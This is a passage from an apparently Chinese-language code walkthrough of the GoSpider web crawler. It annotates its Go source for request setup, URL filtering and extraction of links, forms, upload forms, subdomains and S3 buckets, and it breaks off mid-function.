time.Second<br>&#125;<br><br><span class="hljs-comment">// Disable redirect</span><br>noRedirect, _ := cmd.Flags().GetBool(<span class="hljs-string">&quot;no-redirect&quot;</span>)<br>    <span class="hljs-comment">// 处理重定向</span><br><span class="hljs-keyword">if</span> noRedirect &#123;<br>client.CheckRedirect = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *http.Request, via []*http.Request)</span></span> <span class="hljs-type">error</span> &#123;<br>nextLocation := req.Response.Header.Get(<span class="hljs-string">&quot;Location&quot;</span>)<br>Logger.Debugf(<span class="hljs-string">&quot;Found Redirect: %s&quot;</span>, nextLocation)<br><span class="hljs-comment">// Allow in redirect from http to https or in same hostname</span><br><span class="hljs-comment">// We just check contain hostname or not because we set URLFilter in main collector so if</span><br><span class="hljs-comment">// the URL is https://otherdomain.com/?url=maindomain.com, it will reject it</span><br><span class="hljs-keyword">if</span> strings.Contains(nextLocation, site.Hostname()) &#123;<br>Logger.Infof(<span class="hljs-string">&quot;Redirecting to: %s&quot;</span>, nextLocation)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> http.ErrUseLastResponse<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Set client transport</span><br>client.Transport = DefaultHTTPTransport<br>c.SetClient(client)<br><br><span class="hljs-comment">// Get headers here to overwrite if &quot;burp&quot; flag used</span><br><span class="hljs-comment">// 从 burp 的请求报文中获取 Cookie 和 请求头 设置到 colly 请求中</span><br>burpFile, _ := cmd.Flags().GetString(<span class="hljs-string">&quot;burp&quot;</span>)<br><span class="hljs-keyword">if</span> burpFile != <span class="hljs-string">&quot;&quot;</span> &#123;<br>bF, err := os.Open(burpFile)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>Logger.Errorf(<span class="hljs-string">&quot;Failed to open Burp File: %s&quot;</span>, err)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>rd := bufio.NewReader(bF)<br>req, err := http.ReadRequest(rd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>Logger.Errorf(<span class="hljs-string">&quot;Failed to Parse Raw Request in %s: %s&quot;</span>, burpFile, err)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// Set cookie</span><br>c.OnRequest(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(r *colly.Request)</span></span> &#123;<br>r.Headers.Set(<span class="hljs-string">&quot;Cookie&quot;</span>, GetRawCookie(req.Cookies()))<br>&#125;)<br><span class="hljs-comment">// Set headers</span><br>c.OnRequest(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(r *colly.Request)</span></span> &#123;<br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> req.Header &#123;<br>r.Headers.Set(strings.TrimSpace(k), strings.TrimSpace(v[<span class="hljs-number">0</span>]))<br>&#125;<br>&#125;)<br><br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Set cookies </span><br>cookie, _ := cmd.Flags().GetString(<span class="hljs-string">&quot;cookie&quot;</span>)<br><span class="hljs-keyword">if</span> cookie != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; burpFile == <span class="hljs-string">&quot;&quot;</span> &#123;<br>c.OnRequest(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(r *colly.Request)</span></span> &#123;<br>r.Headers.Set(<span class="hljs-string">&quot;Cookie&quot;</span>, cookie)<br>&#125;)<br>&#125;<br><br><span class="hljs-comment">// Set headers</span><br>headers, _ := cmd.Flags().GetStringArray(<span class="hljs-string">&quot;header&quot;</span>)<br><span class="hljs-keyword">if</span> burpFile == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">for</span> _, h := <span class="hljs-keyword">range</span> headers &#123;<br>headerArgs := strings.SplitN(h, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-number">2</span>)<br>headerKey := strings.TrimSpace(headerArgs[<span class="hljs-number">0</span>])<br>headerValue := strings.TrimSpace(headerArgs[<span class="hljs-number">1</span>])<br>c.OnRequest(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(r *colly.Request)</span></span> &#123;<br>r.Headers.Set(headerKey, headerValue)<br>&#125;)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Set User-Agent 使用 colly 提供的 UA 头</span><br>randomUA, _ := cmd.Flags().GetString(<span class="hljs-string">&quot;user-agent&quot;</span>)<br><span class="hljs-keyword">switch</span> ua := strings.ToLower(randomUA); &#123;<br><span class="hljs-keyword">case</span> ua == <span class="hljs-string">&quot;mobi&quot;</span>:<br>extensions.RandomMobileUserAgent(c)<br><span class="hljs-keyword">case</span> ua == <span class="hljs-string">&quot;web&quot;</span>:<br>extensions.RandomUserAgent(c)<br><span class="hljs-keyword">default</span>:<br>c.UserAgent = ua<br>&#125;<br><br><span class="hljs-comment">// Set referer 添加 Referer</span><br>extensions.Referer(c)<br><br><span class="hljs-comment">// Init Output</span><br><span class="hljs-keyword">var</span> output *Output<br>outputFolder, _ := cmd.Flags().GetString(<span class="hljs-string">&quot;output&quot;</span>)<br><span class="hljs-keyword">if</span> outputFolder != <span class="hljs-string">&quot;&quot;</span> &#123;<br>filename := strings.ReplaceAll(site.Hostname(), <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>)<br>output = NewOutput(outputFolder, filename)<br>&#125;<br><br><span class="hljs-comment">// Init Length Filter</span><br>filterLength_slice := []<span class="hljs-type">int</span>&#123;&#125;<br>filterLength, _ := cmd.Flags().GetString(<span class="hljs-string">&quot;filter-length&quot;</span>)<br><span class="hljs-comment">// 长度过滤</span><br><span class="hljs-keyword">if</span> filterLength != <span class="hljs-string">&quot;&quot;</span> &#123;<br>lengthArgs := strings.Split(filterLength, <span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(lengthArgs); i++ &#123;<br><span class="hljs-keyword">if</span> i, err := strconv.Atoi(lengthArgs[i]); err == <span class="hljs-literal">nil</span> &#123;<br>filterLength_slice = <span class="hljs-built_in">append</span>(filterLength_slice, i)<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Set url whitelist regex</span><br>reg := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> subs &#123;<br>reg = site.Hostname()<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>reg = <span class="hljs-string">&quot;(?:https|http)://&quot;</span> + site.Hostname()<br>&#125;<br><br>sRegex := regexp.MustCompile(reg)<br>c.URLFilters = <span class="hljs-built_in">append</span>(c.URLFilters, sRegex)<br><br><span class="hljs-comment">// Set Limit Rule</span><br>err := c.Limit(&amp;colly.LimitRule&#123;<br>DomainGlob:  <span class="hljs-string">&quot;*&quot;</span>,<br>Parallelism: concurrent,<br>Delay:       time.Duration(delay) * time.Second,<br>RandomDelay: time.Duration(randomDelay) * time.Second,<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>Logger.Errorf(<span class="hljs-string">&quot;Failed to set Limit Rule: %s&quot;</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// GoSpider default disallowed regex</span><br>    <span class="hljs-comment">// 不爬的东西</span><br>disallowedRegex := <span class="hljs-string">`(?i)\.(png|apng|bmp|gif|ico|cur|jpg|jpeg|jfif|pjp|pjpeg|svg|tif|tiff|webp|xbm|3gp|aac|flac|mpg|mpeg|mp3|mp4|m4a|m4v|m4p|oga|ogg|ogv|mov|wav|webm|eot|woff|woff2|ttf|otf|css)(?:\?|#|$)`</span><br>c.DisallowedURLFilters = <span class="hljs-built_in">append</span>(c.DisallowedURLFilters, regexp.MustCompile(disallowedRegex))<br><br><span class="hljs-comment">// Set optional blacklist url regex</span><br>blacklists, _ := cmd.Flags().GetString(<span class="hljs-string">&quot;blacklist&quot;</span>)<br><span class="hljs-keyword">if</span> blacklists != <span class="hljs-string">&quot;&quot;</span> &#123;<br>c.DisallowedURLFilters = <span class="hljs-built_in">append</span>(c.DisallowedURLFilters, regexp.MustCompile(blacklists))<br>&#125;<br><br><span class="hljs-comment">// Set optional whitelist url regex</span><br>    <span class="hljs-comment">// 白名单</span><br>whiteLists, _ := cmd.Flags().GetString(<span class="hljs-string">&quot;whitelist&quot;</span>)<br><span class="hljs-keyword">if</span> whiteLists != <span class="hljs-string">&quot;&quot;</span> &#123;<br>c.URLFilters = <span class="hljs-built_in">make</span>([]*regexp.Regexp, <span class="hljs-number">0</span>)<br>c.URLFilters = <span class="hljs-built_in">append</span>(c.URLFilters, regexp.MustCompile(whiteLists))<br>&#125;<br><br>whiteListDomain, _ := cmd.Flags().GetString(<span class="hljs-string">&quot;whitelist-domain&quot;</span>)<br><span class="hljs-keyword">if</span> whiteListDomain != <span class="hljs-string">&quot;&quot;</span> &#123;<br>c.URLFilters = <span class="hljs-built_in">make</span>([]*regexp.Regexp, <span class="hljs-number">0</span>)<br>c.URLFilters = <span class="hljs-built_in">append</span>(c.URLFilters, regexp.MustCompile(<span class="hljs-string">&quot;http(s)?://&quot;</span>+whiteListDomain))<br>&#125;<br><span class="hljs-comment">// linkFinderCollector</span><br>linkFinderCollector := c.Clone()<br><span class="hljs-comment">// Try to request as much as Javascript source and don&#x27;t care about domain.</span><br><span class="hljs-comment">// The result of link finder will be send to Link Finder Collector to check is it working or not.</span><br>linkFinderCollector.URLFilters = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">if</span> whiteLists != <span class="hljs-string">&quot;&quot;</span> &#123;<br>linkFinderCollector.URLFilters = <span class="hljs-built_in">append</span>(linkFinderCollector.URLFilters, regexp.MustCompile(whiteLists))<br>&#125;<br><span class="hljs-keyword">if</span> whiteListDomain != <span class="hljs-string">&quot;&quot;</span> &#123;<br>linkFinderCollector.URLFilters = <span class="hljs-built_in">append</span>(linkFinderCollector.URLFilters, regexp.MustCompile(<span class="hljs-string">&quot;http(s)?://&quot;</span>+whiteListDomain))<br>&#125;<br><br><span class="hljs-keyword">return</span> &amp;Crawler&#123;<br>cmd:                 cmd,<br>C:                   c,<br>LinkFinderCollector: linkFinderCollector,<br>site:                site,<br>Quiet:               quiet,<br>Input:               site.String(),<br>JsonOutput:          jsonOutput,<br>length:              length,<br>raw:                 raw,<br>domain:              domain,<br>Output:              output,<br>urlSet:              stringset.NewStringFilter(),<br>subSet:              stringset.NewStringFilter(),<br>jsSet:               stringset.NewStringFilter(),<br>formSet:             stringset.NewStringFilter(),<br>awsSet:              stringset.NewStringFilter(),<br>filterLength_slice:  filterLength_slice,<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再看下它是如果处理链接的：</p><p>主要是使用 colly 的 OnHTML、OnResponse 去完成了链接提取操作：</p><ol><li>href &#x3D;&gt; Request.Visit 访问</li><li>form[action] &#x3D;&gt; 添加到 formSet</li><li>input[type&#x3D;”file”] &#x3D;&gt; 添加到 uploadFormSet</li><li>[src] &#x3D;&gt; js、json、xml 链接 &#x3D;&gt; feedLinkfinder 进行链接提取操作</li><li>响应 &#x3D;&gt; 提取 subdomain、aws_s3</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Start 初始化链接</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(crawler *Crawler)</span></span> Start(linkfinder <span class="hljs-type">bool</span>) &#123;<br><span class="hljs-comment">// Setup Link Finder </span><br><span class="hljs-keyword">if</span> linkfinder &#123;<br>        <span class="hljs-comment">// 链接提取模块</span><br>crawler.setupLinkFinder()<br>&#125;<br><br><span class="hljs-comment">// Handle url 从 href 中寻找链接</span><br>crawler.C.OnHTML(<span class="hljs-string">&quot;[href]&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *colly.HTMLElement)</span></span> &#123;<br>urlString := e.Request.AbsoluteURL(e.Attr(<span class="hljs-string">&quot;href&quot;</span>))<br><span class="hljs-comment">// 从链接到完整的 URL</span><br>urlString = FixUrl(crawler.site, urlString)<br><span class="hljs-keyword">if</span> urlString == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 没爬过的</span><br><span class="hljs-keyword">if</span> !crawler.urlSet.Duplicate(urlString) &#123;<br>outputFormat := fmt.Sprintf(<span class="hljs-string">&quot;[href] - %s&quot;</span>, urlString)<br><span class="hljs-keyword">if</span> crawler.JsonOutput &#123;<br>sout := SpiderOutput&#123;<br>Input:      crawler.Input,<br>Source:     <span class="hljs-string">&quot;body&quot;</span>,<br>OutputType: <span class="hljs-string">&quot;form&quot;</span>,<br>Output:     urlString,<br>&#125;<br><span class="hljs-keyword">if</span> data, err := jsoniter.MarshalToString(sout); err == <span class="hljs-literal">nil</span> &#123;<br>outputFormat = data<br>fmt.Println(outputFormat)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> !crawler.Quiet &#123;<br>fmt.Println(outputFormat)<br>&#125;<br><span class="hljs-keyword">if</span> crawler.Output != <span class="hljs-literal">nil</span> &#123;<br>crawler.Output.WriteToFile(outputFormat)<br>&#125;<br><span class="hljs-comment">// 添加到任务中</span><br>_ = e.Request.Visit(urlString)<br>&#125;<br>&#125;)<br><br><span class="hljs-comment">// Handle form</span><br><span class="hljs-comment">// 将 form 表单中的 url 放到 formSet 中 </span><br>crawler.C.OnHTML(<span class="hljs-string">&quot;form[action]&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *colly.HTMLElement)</span></span> &#123;<br>formUrl := e.Request.URL.String()<br><span class="hljs-keyword">if</span> !crawler.formSet.Duplicate(formUrl) &#123;<br>outputFormat := fmt.Sprintf(<span class="hljs-string">&quot;[form] - %s&quot;</span>, formUrl)<br><span class="hljs-keyword">if</span> crawler.JsonOutput &#123;<br>sout := SpiderOutput&#123;<br>Input:      crawler.Input,<br>Source:     <span class="hljs-string">&quot;body&quot;</span>,<br>OutputType: <span class="hljs-string">&quot;form&quot;</span>,<br>Output:     formUrl,<br>&#125;<br><span class="hljs-keyword">if</span> data, err := jsoniter.MarshalToString(sout); err == <span class="hljs-literal">nil</span> &#123;<br>outputFormat = data<br>fmt.Println(outputFormat)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> !crawler.Quiet &#123;<br>fmt.Println(outputFormat)<br>&#125;<br><span class="hljs-keyword">if</span> crawler.Output != <span class="hljs-literal">nil</span> &#123;<br>crawler.Output.WriteToFile(outputFormat)<br>&#125;<br><br>&#125;<br>&#125;)<br><br><span class="hljs-comment">// Find Upload Form</span><br><span class="hljs-comment">// 获取 文件上传类表单的 url</span><br>uploadFormSet := stringset.NewStringFilter()<br>crawler.C.OnHTML(<span class="hljs-string">`input[type=&quot;file&quot;]`</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *colly.HTMLElement)</span></span> &#123;<br>uploadUrl := e.Request.URL.String()<br><span class="hljs-keyword">if</span> !uploadFormSet.Duplicate(uploadUrl) &#123;<br>outputFormat := fmt.Sprintf(<span class="hljs-string">&quot;[upload-form] - %s&quot;</span>, uploadUrl)<br><span class="hljs-keyword">if</span> crawler.JsonOutput &#123;<br>sout := SpiderOutput&#123;<br>Input:      crawler.Input,<br>Source:     <span class="hljs-string">&quot;body&quot;</span>,<br>OutputType: <span class="hljs-string">&quot;upload-form&quot;</span>,<br>Output:     uploadUrl,<br>&#125;<br><span class="hljs-keyword">if</span> data, err := jsoniter.MarshalToString(sout); err == <span class="hljs-literal">nil</span> &#123;<br>outputFormat = data<br>fmt.Println(outputFormat)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> !crawler.Quiet &#123;<br>fmt.Println(outputFormat)<br>&#125;<br><span class="hljs-keyword">if</span> crawler.Output != <span class="hljs-literal">nil</span> &#123;<br>crawler.Output.WriteToFile(outputFormat)<br>&#125;<br>&#125;<br><br>&#125;)<br><br><span class="hljs-comment">// Handle js files 收集 js xml json 链接 feedLinkfinder</span><br>crawler.C.OnHTML(<span class="hljs-string">&quot;[src]&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(e *colly.HTMLElement)</span></span> &#123;<br>jsFileUrl := e.Request.AbsoluteURL(e.Attr(<span class="hljs-string">&quot;src&quot;</span>))<br>jsFileUrl = FixUrl(crawler.site, jsFileUrl)<br><span class="hljs-keyword">if</span> jsFileUrl == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br>fileExt := GetExtType(jsFileUrl)<br><span class="hljs-keyword">if</span> fileExt == <span class="hljs-string">&quot;.js&quot;</span> || fileExt == <span class="hljs-string">&quot;.xml&quot;</span> || fileExt == <span class="hljs-string">&quot;.json&quot;</span> &#123;<br>crawler.feedLinkfinder(jsFileUrl, <span class="hljs-string">&quot;javascript&quot;</span>, <span class="hljs-string">&quot;body&quot;</span>)<br>&#125;<br>&#125;)<br><span class="hljs-comment">// 对于响应 =&gt; 从中寻找链接或者AWSS3</span><br>crawler.C.OnResponse(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(response *colly.Response)</span></span> &#123;<br>respStr := DecodeChars(<span class="hljs-type">string</span>(response.Body))<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(crawler.filterLength_slice) == <span class="hljs-number">0</span> || !contains(crawler.filterLength_slice, <span class="hljs-built_in">len</span>(respStr)) &#123;<br><br><span class="hljs-comment">// Verify which link is working</span><br>u := response.Request.URL.String()<br>outputFormat := fmt.Sprintf(<span class="hljs-string">&quot;[url] - [code-%d] - %s&quot;</span>, response.StatusCode, u)<br><br><span class="hljs-keyword">if</span> crawler.length &#123;<br>outputFormat = fmt.Sprintf(<span class="hljs-string">&quot;[url] - [code-%d] - [len_%d] - %s&quot;</span>, response.StatusCode, <span class="hljs-built_in">len</span>(respStr), u)<br>&#125;<br><br><span class="hljs-keyword">if</span> crawler.JsonOutput &#123;<br>sout := SpiderOutput&#123;<br>Input:      crawler.Input,<br>Source:     <span class="hljs-string">&quot;body&quot;</span>,<br>OutputType: <span class="hljs-string">&quot;url&quot;</span>,<br>StatusCode: response.StatusCode,<br>Output:     u,<br>Length:     strings.Count(respStr, <span class="hljs-string">&quot;\n&quot;</span>),<br>&#125;<br><span class="hljs-keyword">if</span> data, err := jsoniter.MarshalToString(sout); err == <span class="hljs-literal">nil</span> &#123;<br>outputFormat = data<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> crawler.Quiet &#123;<br>outputFormat = u<br>&#125;<br>fmt.Println(outputFormat)<br><span class="hljs-keyword">if</span> crawler.Output != <span class="hljs-literal">nil</span> &#123;<br>crawler.Output.WriteToFile(outputFormat)<br>&#125;<br><span class="hljs-comment">// 确定是目标的响应的话就收集一下子域名和 AWSS3 信息</span><br><span class="hljs-keyword">if</span> InScope(response.Request.URL, crawler.C.URLFilters) &#123;<br>crawler.findSubdomains(respStr)<br>crawler.findAWSS3(respStr)<br>&#125;<br><br><span class="hljs-keyword">if</span> crawler.raw &#123;<br>outputFormat := fmt.Sprintf(<span class="hljs-string">&quot;[Raw] - \n%s\n&quot;</span>, respStr) <span class="hljs-comment">// PRINTCLEAN RAW for link visited only</span><br><span class="hljs-keyword">if</span> !crawler.Quiet &#123;<br>fmt.Println(outputFormat)<br>&#125;<br><span class="hljs-keyword">if</span> crawler.Output != <span class="hljs-literal">nil</span> &#123;<br>crawler.Output.WriteToFile(outputFormat)<br>&#125;<br>&#125;<br>&#125;<br>&#125;)<br><span class="hljs-comment">// 错误响应的输出</span><br>crawler.C.OnError(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(response *colly.Response, err <span class="hljs-type">error</span>)</span></span> &#123;<br>Logger.Debugf(<span class="hljs-string">&quot;Error request: %s - Status code: %v - Error: %s&quot;</span>, response.Request.URL.String(), response.StatusCode, err)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1xx Informational</span><br><span class="hljs-comment">2xx Success</span><br><span class="hljs-comment">3xx Redirection</span><br><span class="hljs-comment">4xx Client Error</span><br><span class="hljs-comment">5xx Server Error</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> response.StatusCode == <span class="hljs-number">404</span> || response.StatusCode == <span class="hljs-number">429</span> || response.StatusCode &lt; <span class="hljs-number">100</span> || response.StatusCode &gt;= <span class="hljs-number">500</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br>u := response.Request.URL.String()<br>outputFormat := fmt.Sprintf(<span class="hljs-string">&quot;[url] - [code-%d] - %s&quot;</span>, response.StatusCode, u)<br><br><span class="hljs-keyword">if</span> crawler.JsonOutput &#123;<br>sout := SpiderOutput&#123;<br>Input:      crawler.Input,<br>Source:     <span class="hljs-string">&quot;body&quot;</span>,<br>OutputType: <span class="hljs-string">&quot;url&quot;</span>,<br>StatusCode: response.StatusCode,<br>Output:     u,<br>Length:     strings.Count(DecodeChars(<span class="hljs-type">string</span>(response.Body)), <span class="hljs-string">&quot;\n&quot;</span>),<br>&#125;<br><span class="hljs-keyword">if</span> data, err := jsoniter.MarshalToString(sout); err == <span class="hljs-literal">nil</span> &#123;<br>outputFormat = data<br>fmt.Println(outputFormat)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> crawler.Quiet &#123;<br>fmt.Println(u)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(outputFormat)<br>&#125;<br><br><span class="hljs-keyword">if</span> crawler.Output != <span class="hljs-literal">nil</span> &#123;<br>crawler.Output.WriteToFile(outputFormat)<br>&#125;<br>&#125;)<br><span class="hljs-comment">// 访问目标</span><br>err := crawler.C.Visit(crawler.site.String())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>Logger.Errorf(<span class="hljs-string">&quot;Failed to start %s: %s&quot;</span>, crawler.site.String(), err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先看一下 setupLinkFinder 是怎么实现链接提取的：</p><p>这里为 colly 添加了一个响应处理，主要工作：</p><ol><li>子域名、S3</li><li>使用 LinkFinder 提取响应中的路径对路径进行拼接获取 URL</li><li>如果是 js 、json 的就还是交给 feedLinkfinder 处理</li><li>不是的话就访问这个拼接好的链接</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(crawler *Crawler)</span></span> setupLinkFinder() &#123;<br>    <span class="hljs-comment">// 处理响应</span><br>crawler.LinkFinderCollector.OnResponse(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(response 